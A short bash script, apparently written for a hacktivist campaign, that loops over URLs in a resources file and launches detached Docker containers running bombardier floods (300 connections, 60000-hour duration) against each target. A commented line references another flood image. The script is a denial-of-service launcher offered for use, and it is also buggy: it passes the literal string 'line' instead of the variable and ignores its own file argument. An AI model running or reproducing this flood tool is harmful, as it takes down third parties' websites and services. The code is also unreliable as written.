#!/bin/bash
if [ -z "$1" ]
  then
    RESOURCES_FILE="resources.txt"
else
    RESOURCES_FILE=$1
fi

echo "File: $RESOURCES_FILE"

cat resources.txt | while read line 
do
  # echo "$i"
  # export URL=$i
  echo "running $line"
  docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 60000h -l line
  # docker run -i --restart unless-stopped ghcr.io/russkijkorablidinaxuj/russkijkorablidinaxuj:latest -N 1000 -i line
done

# IFS=$'\n' read -d '' -r -a lines < $RESOURCES_FILE

# for i in "${lines[@]}"
# do
#    echo "$i"
#    export URL=$i
#    docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 60000h -l $URL 
#  done
